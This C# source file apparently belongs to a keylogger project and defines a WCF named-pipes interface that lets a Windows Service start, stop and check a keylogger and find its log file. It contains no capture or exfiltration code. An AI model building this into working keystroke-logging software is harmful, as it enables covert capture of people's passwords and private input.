using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.ServiceModel;

namespace KeyloggerCommunications
{
    /* This interface is implemented by both the Windows Service and the keylogger
     * application. It's used to define the methods that will be used for inter-process
     * communication. Everything in this interface must be public so only things that
     * can be publicly exposed should be added here. The [ServiceContract] and
     * [OperationContract] keywords are used to define the exposed methods to the
     * Named Pipes communication structure that we're using. Basically if you need
     * to create a new method just add [OperationContract] to the top of it. See
     * the individual classes for implementation descriptions.
     */

    [ServiceContract]
    public interface KeyloggerCommInterface
    {
        [OperationContract]
        bool StartKeylogger();

        [OperationContract]
        bool StopKeylogger();

        [OperationContract]
        String GetKeylogFilePath();

        [OperationContract]
        bool CheckIfRunning();
    }
}